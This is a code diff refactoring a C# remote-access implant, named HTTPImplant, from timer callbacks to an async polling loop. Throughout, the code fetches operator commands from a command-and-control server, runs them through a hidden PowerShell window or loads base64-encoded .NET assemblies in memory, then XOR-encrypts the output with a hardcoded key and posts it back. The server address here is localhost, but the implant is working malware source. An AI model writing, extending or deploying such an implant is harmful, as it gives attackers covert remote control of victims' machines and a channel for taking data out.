@@ -18,105 +18,92 @@ namespace HTTPImplant
         public string port { get; set; }  // Port of the implant server
         private static string lastCommandExecuted = string.Empty; // Store the last command that was executed
 
-        // Main method that is executed when the program is started.
         public static void Main(string[] args)
         {
             while (true)
             {
-                Task.Delay(3000);
-                Do();
+                DoAsync().GetAwaiter().GetResult();
             }
         }
-        public static void Do()
+        public static async Task DoAsync()
         {
-            string implantId = Environment.MachineName; // The ID of the implant is set as the machine's name
-            var webClient = new WebClient(); // WebClient for communication with the server
+            string implantId = Environment.MachineName;
+            string lastCommandExecuted = string.Empty;
 
-            // Timer set to 7 seconds, checks the server for commands to execute.
-            var checkForCommandTimer = new System.Timers.Timer(7000); 
-            checkForCommandTimer.Elapsed += (sender, e) =>
+            using (WebClient webClient = new WebClient())
             {
-                webClient.DownloadStringAsync(new Uri("http://127.0.0.1:8081/fetchCommand"));
-            };
-            checkForCommandTimer.AutoReset = true;
-            checkForCommandTimer.Enabled = true;
-
-            // Event handler for when the WebClient finishes downloading the string
-            webClient.DownloadStringCompleted += (sender, e) =>
-            {
-                if (e.Error == null)
+                while (true)
                 {
-                    string jsonResponse = e.Result; // The response from the server
-
-                    Command command = new Command();
-                    // Parse the JSON response to the Command object properties
-                    command.Input = jsonResponse.Split(new string[] { "\"Input\":\"", "\",\"ImplantUser" }, StringSplitOptions.None)[1];
-                    command.ImplantUser = jsonResponse.Split(new string[] { "\"ImplantUser\":\"", "\",\"Operator" }, StringSplitOptions.None)[1];
-                    command.Operator = jsonResponse.Split(new string[] { "\"Operator\":\"", "\",\"timeToExec" }, StringSplitOptions.None)[1];
-                    command.TimeToExec = jsonResponse.Split(new string[] { "\"timeToExec\":\"", "\",\"delay" }, StringSplitOptions.None)[1];
-                    command.Delay = jsonResponse.Split(new string[] { "\"delay\":\"", "\",\"File" }, StringSplitOptions.None)[1];
-                    command.File = jsonResponse.Split(new string[] { "\"File\":\"", "\",\"Command" }, StringSplitOptions.None)[1];
-                    command.command = jsonResponse.Split(new string[] { "\"Command\":\"", "\"}" }, StringSplitOptions.None)[1];
-
-                    // If the received command is the same as the last one executed, it's ignored.
-                    if (command.command == lastCommandExecuted)
-                        return;
-
-                    lastCommandExecuted = command.command;
-
-                    // Depending on the command input, different actions are performed
-                    if (command.Input.Contains("os"))
+                    try
                     {
-                        // Start a PowerShell process with the command
-                        ProcessStartInfo processStartInfo = new ProcessStartInfo
-                        {
-                            FileName = "powershell.exe",
-                            Arguments = "-NoLogo -NonInteractive -NoProfile -Command " + command.command,
-                            RedirectStandardOutput = true,
-                            UseShellExecute = false,
-                            CreateNoWindow = true
-                        };
-                        Process process = new Process
-                        {
-                            StartInfo = processStartInfo
-                        };
-                        process.Start();
+                        string jsonResponse = await webClient.DownloadStringTaskAsync(new Uri("http://127.0.0.1:8081/fetchCommand"));
 
-                        // Read the process output and send it back to the server
-                        string output = process.StandardOutput.ReadToEnd();
-                        process.WaitForExit();
-                        string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
-                        SendResult(webClient, implantId, command.Operator, outputBase64);
+                        Command command = new Command();
+                        command.Input = jsonResponse.Split(new string[] { "\"Input\":\"", "\",\"ImplantUser" }, StringSplitOptions.None)[1];
+                        command.ImplantUser = jsonResponse.Split(new string[] { "\"ImplantUser\":\"", "\",\"Operator" }, StringSplitOptions.None)[1];
+                        command.Operator = jsonResponse.Split(new string[] { "\"Operator\":\"", "\",\"timeToExec" }, StringSplitOptions.None)[1];
+                        command.TimeToExec = jsonResponse.Split(new string[] { "\"timeToExec\":\"", "\",\"delay" }, StringSplitOptions.None)[1];
+                        command.Delay = jsonResponse.Split(new string[] { "\"delay\":\"", "\",\"File" }, StringSplitOptions.None)[1];
+                        command.File = jsonResponse.Split(new string[] { "\"File\":\"", "\",\"Command" }, StringSplitOptions.None)[1];
+                        command.command = jsonResponse.Split(new string[] { "\"Command\":\"", "\"}" }, StringSplitOptions.None)[1];
+
+                        if (command.command == lastCommandExecuted)
+                            continue;
+
+                        lastCommandExecuted = command.command;
+
+                        if (command.Input.Contains("os"))
+                        {
+                            ProcessStartInfo processStartInfo = new ProcessStartInfo
+                            {
+                                FileName = "powershell.exe",
+                                Arguments = "-NoLogo -NonInteractive -NoProfile -Command " + command.command,
+                                RedirectStandardOutput = true,
+                                UseShellExecute = false,
+                                CreateNoWindow = true
+                            };
+
+                            Process process = new Process
+                            {
+                                StartInfo = processStartInfo
+                            };
+
+                            process.Start();
+
+                            string output = process.StandardOutput.ReadToEnd();
+                            process.WaitForExit();
+
+                            string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
+                            await SendResult(webClient, implantId, command.Operator, outputBase64);
+                        }
+                        else if (command.Input.Contains("execute-assembly"))
+                        {
+                            byte[] bytes = Convert.FromBase64String(command.File);
+                            string output = ExecuteAssembly.Execute(bytes);
+                            string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
+                            await SendResult(webClient, implantId, command.Operator, outputBase64);
+                        }
                     }
-                    else if (command.Input.Contains("execute-assembly"))
+                    catch (Exception e)
                     {
-                        // If the command is to execute an assembly, the assembly is executed and its output is sent back to the server
-                        byte[] bytes = Convert.FromBase64String(command.File);
-                        string output = ExecuteAssembly.Execute(bytes);
-                        string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
-                        SendResult(webClient, implantId, command.Operator, outputBase64);
+                        // Handle error scenario
                     }
+
+                    await Task.Delay(7000);
                 }
-            };
-
-            // Start checking for commands from the server
-            webClient.DownloadStringAsync(new Uri("http://127.0.0.1:8081/fetchCommand"));
+            }
         }
-        public static void SendResult(WebClient webClient, string implantId, string operatorId, string outputBase64)
+
+        public static async Task SendResult(WebClient webClient, string implantId, string operatorId, string outputBase64)
         {
-            // Create the JSON payload
-            string resultJson = "{" + "\"ImplantId\": \"" + implantId + "\"," + "\"OperatorId\": \"" + operatorId + "\"," + "\"Output\": \"" + outputBase64 + "\"," + "\"DateFromLast\": \"" + DateTime.UtcNow.ToString("O") + "\"" + "}";
-
-            Console.WriteLine(resultJson);
-
             string XORKeyB64 = "NVm5dzr1hyhOm4jBTNSFhQGrFhR1gvhbn/BbvZowkO0=";
             byte[] XORKey = Convert.FromBase64String(XORKeyB64);
+
+            string resultJson = "{" + "\"ImplantId\": \"" + implantId + "\"," + "\"OperatorId\": \"" + operatorId + "\"," + "\"Output\": \"" + outputBase64 + "\"," + "\"DateFromLast\": \"" + DateTime.UtcNow.ToString("O") + "\"" + "}";
             byte[] encryptedResultJson = XOR(Encoding.UTF8.GetBytes(resultJson), XORKey);
 
-            // Proceed with sending results
-            webClient.UploadStringCompleted += (sender2, e2) => { };
             string data = Convert.ToBase64String(encryptedResultJson);
-            webClient.UploadStringAsync(new Uri("http://127.0.0.1:8081/fetchOutput"), "POST", data);
+            await webClient.UploadStringTaskAsync(new Uri("http://127.0.0.1:8081/fetchOutput"), "POST", data);
         }
 
         public static byte[] XOR(byte[] data, byte[] key)
@@ -128,6 +115,7 @@ namespace HTTPImplant
             }
             return result;
         }
+
     }
 
     // The Command class represents a command that is sent from the server.
